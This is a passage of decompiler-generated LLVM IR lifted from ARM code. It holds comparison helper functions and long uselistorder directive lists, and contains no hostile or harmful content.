  %v1_196b4 = call i32 @function_196bc(i32 %v1_196ac)
  store i32 %v1_196b4, i32* %r0.global-to-local, align 4
  ret i32 %v1_196b4

; uselistorder directives
  uselistorder i32 %v5_1968c, { 1, 0, 2 }
  uselistorder i32 %v1_19648, { 1, 0 }
  uselistorder i32 %v1_19628, { 1, 0 }
  uselistorder i32 %v0_19628, { 3, 1, 0, 2 }
  uselistorder i32 %v10_19610, { 2, 0, 1 }
  uselistorder i32 %v6_1960c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_19604, { 1, 0 }
  uselistorder i32 %v2_195ec, { 1, 0, 2 }
  uselistorder i32 %v1_195ec, { 1, 0, 2 }
  uselistorder i32 %v1_195e8, { 1, 0, 2 }
  uselistorder i32 %v0_195e8, { 1, 0, 2 }
  uselistorder i1 %v7_195dc, { 1, 0 }
  uselistorder i32 %v2_195c0, { 1, 0 }
  uselistorder i32 %v3_195ac, { 2, 1, 0 }
  uselistorder i32 %v3_195a0, { 0, 2, 1 }
  uselistorder i32 %v5_1959c, { 2, 0, 1 }
  uselistorder i32 %v6_1958c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_19578, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_19574, { 3, 0, 2, 1 }
  uselistorder i32 %v0_19580, { 0, 2, 1 }
  uselistorder i32 %v1_1958c, { 1, 0 }
  uselistorder i32 %v6_19570, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1955c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_19558, { 0, 2, 1 }
  uselistorder i32 %v0_19564, { 0, 2, 1 }
  uselistorder i32 %v1_19570, { 1, 0 }
  uselistorder i32 %v6_19554, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_19540, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19548, { 0, 2, 1 }
  uselistorder i32 %v1_19554, { 1, 0 }
  uselistorder i32 %v3_19538, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1952c, { 1, 2, 0 }
  uselistorder i32 %v3_195ac13, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_195a817, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1952c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_19538, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_195d4.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_19518, { 1, 0 }
  uselistorder i32 %v0_1951c, { 1, 0 }
  uselistorder i32 %v3_19508, { 1, 0 }
  uselistorder i1 %v1_194fc, { 1, 0 }
  uselistorder i32 %v3_194ec, { 2, 3, 1, 0 }
  uselistorder i32 %v5_194e8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_194e0, { 2, 1, 0 }
  uselistorder i32 %v5_194dc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_194bc, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_194ac, { 2, 3, 1, 0 }
  uselistorder i32 %v5_194ac, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_194a8, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_194a8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1949c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 3, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 3, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 8, 9, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 0, 3, 9, 10, 4, 5, 6, 7, 8, 11 }
  uselistorder i32* %ip.global-to-local, { 4, 2, 3, 5, 0, 1, 7, 6 }
  uselistorder i32 (i32)* @function_196bc, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_1948c, { 2, 1, 0 }
  uselistorder i32 ()* @function_192f8, { 1, 0 }
  uselistorder i1* @cpsr_n, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 1024, { 1, 12, 13, 14, 15, 2, 16, 0, 3, 17, 18, 19, 4, 5, 20, 6, 21, 7, 22, 23, 24, 25, 11, 26, 10, 27, 9, 28, 29, 30, 8 }
  uselistorder i32 1791, { 1, 0 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 7, 5, 6, 8, 9, 21, 10, 11, 2, 12, 13, 58, 59, 79, 80, 50, 51, 52, 53, 54, 60, 61, 62, 63, 64, 3, 31, 32, 33, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 65, 66, 67, 68, 69, 70, 71, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 72, 14, 91, 34, 92, 73, 74, 37, 38, 75, 76, 55, 56, 57, 24, 107, 35, 77, 118, 119, 120, 0, 121, 122, 78, 23, 93, 94, 95, 98, 99, 100, 101, 102, 103, 104, 105, 49, 96, 97, 15, 22, 16, 4, 17, 18, 19, 25, 39, 40, 106, 108, 109, 41, 110, 42, 111, 43, 112, 44, 36, 113, 30, 114, 29, 115, 28, 27, 45, 116, 26, 117, 46, 20, 47, 48 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 77, 76, 44, 6, 7, 31, 8, 87, 88, 89, 90, 40, 117, 79, 80, 81, 82, 91, 92, 93, 94, 95, 96, 97, 98, 99, 180, 229, 52, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 100, 101, 102, 103, 118, 119, 120, 121, 122, 123, 124, 125, 126, 9, 53, 127, 51, 128, 129, 78, 130, 131, 104, 42, 105, 106, 107, 132, 133, 134, 108, 109, 110, 111, 112, 113, 83, 84, 85, 86, 60, 247, 248, 45, 114, 10, 164, 178, 115, 43, 181, 182, 183, 184, 185, 186, 187, 188, 11, 64, 189, 190, 191, 192, 193, 194, 195, 196, 12, 197, 198, 199, 200, 13, 201, 202, 14, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 220, 213, 214, 215, 216, 65, 33, 217, 218, 219, 66, 67, 15, 221, 222, 223, 224, 226, 227, 68, 16, 228, 17, 225, 116, 56, 57, 54, 55, 34, 35, 49, 50, 58, 249, 137, 138, 139, 74, 140, 141, 142, 143, 41, 144, 69, 70, 145, 146, 147, 59, 148, 149, 150, 151, 36, 37, 152, 153, 154, 71, 135, 136, 61, 75, 46, 18, 19, 32, 20, 155, 156, 157, 158, 159, 72, 38, 21, 160, 73, 39, 22, 161, 162, 163, 62, 165, 166, 167, 23, 168, 24, 169, 25, 170, 26, 27, 171, 172, 173, 174, 175, 28, 63, 48, 29, 47, 30, 176, 177, 179 }
  uselistorder i32 4, {}
  uselistorder i32 32, { 74, 75, 76, 77, 36, 37, 45, 64, 65, 39, 40, 78, 38, 46, 79, 80, 81, 82, 43, 83, 66, 67, 68, 69, 101, 47, 41, 70, 71, 72, 84, 53, 26, 85, 86, 73, 54, 55, 56, 57, 104, 96, 97, 49, 48, 1, 2, 4, 3, 102, 6, 5, 8, 7, 10, 9, 42, 87, 88, 25, 89, 0, 58, 90, 91, 92, 93, 94, 95, 27, 103, 59, 60, 12, 11, 29, 14, 13, 28, 16, 15, 30, 44, 98, 99, 100, 18, 17, 31, 50, 61, 32, 20, 19, 22, 21, 33, 34, 24, 23, 35, 51, 52, 62, 63 }
  uselistorder i32 33, { 4, 5, 6, 3, 7, 8, 0, 2, 1 }
  uselistorder i32 768, { 2, 0, 1 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 76, 78, 41, 42, 43, 81, 44, 82, 45, 83, 46, 84, 79, 85, 47, 48, 50, 49, 51, 52, 53, 54, 0, 77, 1, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 86, 67, 68, 69, 75, 80, 74, 70, 71, 72, 73 }
  uselistorder i32 1048576, { 17, 0, 1, 2, 18, 19, 11, 3, 4, 5, 20, 6, 7, 21, 22, 13, 14, 8, 9, 23, 24, 25, 15, 26, 10, 16, 12, 27 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 95, 96, 97, 98, 99, 100, 101, 102, 103, 20, 21, 19, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 3, 45, 46, 4, 47, 48, 49, 5, 50, 51, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 0, 117, 118, 119, 120, 121, 122, 123, 124, 125, 6, 126, 127, 128, 129, 130, 131, 132, 52, 53, 7, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 8, 9, 71, 72, 73, 74, 75, 76, 77, 78, 22, 23, 24, 25, 26, 27, 28, 10, 11, 12, 224, 225, 226, 227, 228, 229, 230, 79, 13, 80, 14, 81, 221, 222, 223, 82, 83, 84, 182, 183, 184, 185, 85, 86, 87, 88, 89, 90, 189, 193, 194, 195, 196, 190, 191, 192, 197, 198, 199, 200, 201, 15, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 217, 219, 213, 214, 215, 216, 218, 220, 133, 134, 91, 177, 178, 179, 180, 181, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 16, 18, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 2, 164, 165, 17, 92, 149, 1, 150, 151, 166, 167, 168, 169, 170, 93, 94, 171, 172, 173, 174, 175, 176, 186, 187, 188 }
  uselistorder i32* @r5, { 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 29, 30, 31, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 6, 207, 208, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 54, 55, 56, 7, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 8, 73, 74, 158, 159, 160, 161, 341, 342, 343, 75, 26, 76, 3, 77, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 24, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 0, 226, 227, 228, 229, 230, 231, 100, 101, 102, 103, 104, 105, 9, 106, 107, 108, 109, 110, 111, 112, 10, 113, 114, 115, 13, 116, 117, 11, 118, 119, 120, 121, 122, 123, 12, 124, 125, 126, 127, 128, 129, 44, 14, 45, 46, 47, 48, 27, 32, 15, 49, 50, 51, 52, 53, 356, 16, 357, 358, 366, 130, 131, 132, 133, 134, 135, 136, 359, 360, 361, 362, 137, 138, 139, 140, 141, 142, 143, 144, 145, 291, 292, 293, 146, 147, 148, 149, 150, 363, 364, 365, 151, 152, 153, 154, 309, 310, 314, 315, 316, 317, 318, 311, 312, 313, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 5, 332, 333, 334, 335, 336, 17, 337, 338, 339, 340, 232, 233, 234, 235, 236, 288, 289, 18, 290, 162, 19, 163, 164, 165, 237, 20, 238, 28, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 252, 251, 253, 254, 21, 255, 256, 257, 258, 259, 260, 25, 261, 262, 266, 4, 267, 1, 268, 269, 270, 271, 272, 273, 274, 275, 276, 155, 156, 157, 263, 264, 265, 277, 2, 22, 278, 279, 166, 167, 280, 281, 23, 282, 283, 284, 285, 286, 287, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_19688, { 1, 0 }
  uselistorder label %dec_label_pc_1966c, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_19638, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_19528, { 1, 0 }
  uselistorder label %dec_label_pc_19510, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_196b8() local_unnamed_addr {
dec_label_pc_196b8:
  store i32 1, i32* @ip, align 4
  %v0_196b8 = load i32, i32* @r0, align 4
  ret i32 %v0_196b8
}

define i32 @function_196bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_196bc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_196bc = load i32, i32* @ip, align 4
  %v0_196c0 = load i32, i32* @r1, align 4
  %v2_196c0 = mul i32 %v0_196c0, 2
  %v2_196c0.off = add i32 %v2_196c0, 4194303
  %tmp = icmp ult i32 %v2_196c0.off, 2097152
  %v0_196c8 = load i32, i32* @r3, align 4
  %v2_196c8 = mul i32 %v0_196c8, 2
  br i1 %tmp, label %dec_label_pc_19718, label %bb

bb:                                               ; preds = %dec_label_pc_196bc
  %v2_196c8.off = add i32 %v2_196c8, 4194303
  %tmp21 = icmp ult i32 %v2_196c8.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1970c, label %dec_label_pc_196d4

dec_label_pc_196d4:                               ; preds = %dec_label_pc_19720, %dec_label_pc_1972c, %bb
  %v0_196d4 = load i32, i32* %r0.global-to-local, align 4
  %v4_196d4 = or i32 %v0_196d4, %v2_196c0
  store i32 %v4_196d4, i32* @ip, align 4
  %v6_196d4 = icmp eq i32 %v4_196d4, 0
  br i1 %v6_196d4, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_196d4
  %v1_196d8 = load i32, i32* @r2, align 4
  %v5_196d8 = or i32 %v1_196d8, %v2_196c8
  store i32 %v5_196d8, i32* @ip, align 4
  %v7_196d8 = icmp eq i32 %v5_196d8, 0
  br i1 %v7_196d8, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_196d4, %bb10
  %v5_196dc = icmp eq i32 %v0_196c8, %v0_196c0
  br i1 %v5_196dc, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_196e0.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_196e0 = phi i32 [ %v2_196e0.pre, %.thread..thread1_crit_edge ], [ %v1_196d8, %bb10 ]
  %v5_196e0 = icmp eq i32 %v2_196e0, %v0_196d4
  br i1 %v5_196e0, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_196e8 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_196e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_196e8, i32 %v0_196e8)
  %v0_196ec = load i32, i32* %r0.global-to-local, align 4
  %v0_196f0 = load i32, i32* @r1, align 4
  %v1_196f0 = load i32, i32* @r3, align 4
  %v2_196f0 = xor i32 %v1_196f0, %v0_196f0
  %v3_196f0 = icmp slt i32 %v2_196f0, 0
  br i1 %v3_196f0, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_196f4 = icmp eq i32 %v0_196f0, %v1_196f0
  br i1 %v10_196f4, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_196f8 = load i32, i32* @r2, align 4
  %v4_196f8 = icmp ult i32 %v0_196ec, %v2_196f8
  br i1 %v4_196f8, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_196f4 = icmp ult i32 %v0_196f0, %v1_196f0
  br i1 %v4_196f4, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_196f0, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_196fc = and i32 %v1_196f0, 1073741824
  %v3_196fc = icmp eq i32 %v2_196fc, 0
  %v4_196fc = ashr i32 %v1_196f0, 31
  br i1 %v3_196fc, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_19700.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_196fc, %bb15 ]
  %v5_19700 = sub nsw i32 -1, %v4_19700.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_19704 = phi i32 [ %v5_19700, %.thread3 ], [ %v4_196fc, %bb15 ]
  %v1_19704 = or i32 %v0_19704, 1
  store i32 %v1_19704, i32* %r0.global-to-local, align 4
  ret i32 %v1_19704

dec_label_pc_1970c:                               ; preds = %bb
  br label %dec_label_pc_19720

dec_label_pc_19718:                               ; preds = %dec_label_pc_196bc
  %v0_19718 = load i32, i32* %r0.global-to-local, align 4
  %v4_19718 = mul i32 %v0_196c0, 4096
  %v5_19718 = or i32 %v0_19718, %v4_19718
  store i32 %v5_19718, i32* @ip, align 4
  %v7_19718 = icmp eq i32 %v5_19718, 0
  br i1 %v7_19718, label %dec_label_pc_19718.dec_label_pc_19720_crit_edge, label %dec_label_pc_19734

dec_label_pc_19718.dec_label_pc_19720_crit_edge:  ; preds = %dec_label_pc_19718
  %v2_196c8.off20 = add i32 %v2_196c8, 4194303
  %tmp22 = icmp ult i32 %v2_196c8.off20, 2097152
  br label %dec_label_pc_19720

dec_label_pc_19720:                               ; preds = %dec_label_pc_19718.dec_label_pc_19720_crit_edge, %dec_label_pc_1970c
  %v3_19724.pre-phi = phi i1 [ %tmp22, %dec_label_pc_19718.dec_label_pc_19720_crit_edge ], [ true, %dec_label_pc_1970c ]
  br i1 %v3_19724.pre-phi, label %dec_label_pc_1972c, label %dec_label_pc_196d4

dec_label_pc_1972c:                               ; preds = %dec_label_pc_19720
  %v0_1972c = load i32, i32* @r2, align 4
  %v4_1972c = mul i32 %v0_196c8, 4096
  %v5_1972c = or i32 %v0_1972c, %v4_1972c
  store i32 %v5_1972c, i32* @ip, align 4
  %v7_1972c = icmp eq i32 %v5_1972c, 0
  br i1 %v7_1972c, label %dec_label_pc_196d4, label %dec_label_pc_19734

dec_label_pc_19734:                               ; preds = %dec_label_pc_19718, %dec_label_pc_1972c
  store i32 %v0_196bc, i32* %r0.global-to-local, align 4
  ret i32 %v0_196bc

; uselistorder directives
  uselistorder i32 %v1_196f0, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_196f0, { 2, 1, 0 }
  uselistorder i32 %v1_196d8, { 1, 0 }
  uselistorder i32 %v2_196c8, { 0, 2, 1 }
  uselistorder i32 %v0_196c8, { 1, 0, 2 }
  uselistorder i32 %v2_196c0, { 1, 0 }
  uselistorder i32 %v0_196c0, { 1, 0, 2 }
  uselistorder i32 %v0_196bc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 0, 1 }
  uselistorder i32 31, { 9, 4, 2, 5, 6, 10, 3, 18, 11, 7, 8, 1, 12, 0, 13, 14, 15, 16, 17 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 45, 50, 6, 7, 8, 38, 9, 10, 11, 12, 55, 60, 58, 59, 57, 51, 52, 5, 39, 40, 53, 54, 56, 47, 48, 42, 13, 43, 41, 44, 46, 49 }
  uselistorder i32* @r3, { 29, 30, 9, 31, 32, 33, 10, 11, 34, 35, 7, 36, 37, 38, 39, 40, 41, 42, 43, 44, 13, 14, 15, 16, 17, 91, 92, 4, 93, 94, 95, 5, 96, 97, 98, 6, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 0, 117, 118, 119, 120, 3, 45, 46, 47, 62, 63, 64, 48, 49, 18, 19, 20, 21, 22, 50, 51, 52, 53, 12, 121, 129, 130, 131, 127, 122, 65, 66, 84, 85, 67, 27, 54, 89, 90, 23, 24, 25, 135, 132, 133, 134, 2, 136, 137, 138, 55, 56, 26, 28, 128, 57, 58, 59, 123, 124, 125, 126, 86, 87, 88, 1, 60, 61, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 8, 82, 83 }
  uselistorder i32* @r1, { 43, 44, 17, 45, 46, 47, 48, 49, 50, 18, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 20, 21, 22, 23, 24, 62, 1, 63, 64, 65, 66, 67, 68, 69, 10, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 25, 15, 156, 30, 81, 27, 28, 31, 32, 2, 33, 163, 34, 147, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 3, 187, 188, 35, 82, 83, 84, 121, 122, 123, 124, 125, 85, 86, 87, 88, 89, 90, 91, 92, 93, 36, 16, 37, 0, 26, 29, 13, 38, 189, 126, 127, 128, 157, 4, 166, 5, 165, 94, 14, 164, 130, 129, 40, 41, 42, 95, 96, 97, 11, 98, 99, 100, 101, 102, 6, 160, 161, 8, 7, 103, 104, 105, 106, 107, 9, 108, 109, 110, 12, 39, 19, 167, 168, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 148, 149, 150, 151, 152, 153, 154, 155, 158, 159, 162, 169 }
  uselistorder i32* @ip, { 31, 32, 33, 34, 35, 36, 11, 12, 37, 38, 39, 40, 41, 42, 13, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 2, 53, 14, 15, 16, 17, 18, 19, 20, 21, 90, 91, 22, 87, 10, 55, 54, 4, 56, 57, 5, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 8, 134, 135, 136, 137, 138, 139, 140, 141, 142, 23, 3, 24, 25, 58, 59, 26, 27, 28, 60, 61, 62, 143, 93, 9, 94, 95, 29, 30, 63, 100, 65, 64, 6, 147, 144, 145, 146, 7, 148, 67, 68, 69, 70, 71, 72, 73, 74, 66, 75, 76, 77, 78, 79, 80, 81, 82, 0, 83, 1, 84, 86, 88, 89, 92, 96, 97, 98, 99, 85 }
  uselistorder label %dec_label_pc_19734, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_196d4, { 1, 0, 2 }
}

define i32 @function_1973c() local_unnamed_addr {
dec_label_pc_1973c:
  %v0_19740 = load i32, i32* @r2, align 4
  store i32 %v0_19740, i32* @r0, align 4
  %v0_19754 = call i32 @function_19758()
  ret i32 %v0_19754

; uselistorder directives
  uselistorder i32* @r2, { 28, 29, 30, 3, 31, 15, 32, 33, 34, 35, 36, 37, 12, 38, 39, 40, 41, 42, 43, 4, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 16, 17, 18, 19, 5, 20, 13, 115, 11, 147, 148, 149, 55, 56, 57, 104, 58, 59, 60, 61, 62, 63, 64, 65, 21, 22, 66, 67, 68, 69, 70, 1, 14, 23, 24, 25, 150, 154, 155, 156, 157, 2, 160, 105, 106, 151, 6, 7, 8, 107, 27, 71, 72, 73, 74, 116, 117, 0, 158, 9, 159, 75, 10, 76, 77, 78, 80, 81, 82, 83, 84, 85, 87, 86, 88, 89, 90, 91, 79, 26, 152, 153, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 108, 109, 110, 111, 112, 113, 114, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146 }
}

define i32 @function_19758() local_unnamed_addr {
dec_label_pc_19758:
  %stack_var_-8 = alloca i32, align 4
  %v3_19758 = load i32, i32* @r0, align 4
  store i32 %v3_19758, i32* %stack_var_-8, align 4
  %v0_1975c = call i32 @function_196b8()
  store i1 true, i1* @cpsr_c, align 1
  %v1_19760 = icmp slt i32 %v0_1975c, 0
  %v2_19760 = icmp eq i32 %v0_1975c, 0
  store i1 %v2_19760, i1* @cpsr_z, align 1
  br i1 %v1_19760, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_19758
  store i1 false, i1* @cpsr_c, align 1
  store i1 false, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_19758, %bb
  %v2_19768 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_19768

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_19770(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_19770:
  %v0_19774 = call i32 @function_19758()
  %v0_19778 = load i1, i1* @cpsr_z, align 1
  %.v0_19774. = zext i1 %v0_19778 to i32
  ret i32 %.v0_19774.
}

define i32 @function_19788(i32 %arg1) local_unnamed_addr {
dec_label_pc_19788:
  %v0_1978c = call i32 @function_19758()
  %v0_19790 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_19790 to i32
  %.v0_1978c. = xor i32 %tmp2, 1
  ret i32 %.v0_1978c.
}

define i32 @function_197a0() local_unnamed_addr {
dec_label_pc_197a0:
  %v0_197a4 = call i32 @function_19758()
  %v0_197a8 = load i1, i1* @cpsr_z, align 1
  %v1_197a8 = load i1, i1* @cpsr_c, align 1
  %v2_197a8 = xor i1 %v1_197a8, true
  %v3_197a8 = or i1 %v0_197a8, %v2_197a8
  %.v0_197a4 = select i1 %v3_197a8, i32 1, i32 %v0_197a4
  %v2_197ac = xor i1 %v0_197a8, true
  %v3_197ac = and i1 %v1_197a8, %v2_197ac
  %..v0_197a4 = select i1 %v3_197ac, i32 0, i32 %.v0_197a4
  ret i32 %..v0_197a4

; uselistorder directives
  uselistorder i1 %v1_197a8, { 1, 0 }
  uselistorder i32 ()* @function_19758, { 2, 1, 0, 3 }
}

define i32 @function_197b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_197b8:
  %stack_var_-8 = alloca i32, align 4
  %v0_197b8 = load i32, i32* @lr, align 4
  store i32 %v0_197b8, i32* %stack_var_-8, align 4
  %v0_197bc = call i32 @function_1973c()
  %v0_197c0 = load i1, i1* @cpsr_z, align 1
  %v1_197c0 = load i1, i1* @cpsr_c, align 1
  %v2_197c0 = xor i1 %v1_197c0, true
  %v3_197c0 = or i1 %v0_197c0, %v2_197c0
  %.v0_197bc = select i1 %v3_197c0, i32 1, i32 %v0_197bc
  %v2_197c4 = xor i1 %v0_197c0, true
  %v3_197c4 = and i1 %v1_197c0, %v2_197c4
  %..v0_197bc = select i1 %v3_197c4, i32 0, i32 %.v0_197bc
  %v2_197c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_197c8, i32* @lr, align 4
  ret i32 %..v0_197bc

; uselistorder directives
  uselistorder i1 %v1_197c0, { 1, 0 }
  uselistorder i1 true, { 1, 2, 3, 4, 89, 0, 81, 5, 6, 7, 8, 9, 10, 75, 76, 82, 83, 77, 11, 12, 13, 78, 79, 80, 84, 14, 15, 16, 17, 18, 19, 20, 21, 85, 90, 22, 23, 24, 86, 27, 28, 29, 30, 25, 26, 87, 31, 32, 33, 34, 88, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 91, 92, 93, 94, 59, 60, 73, 61, 62, 63, 64, 74, 65, 66, 67, 68, 69, 70, 71, 72 }
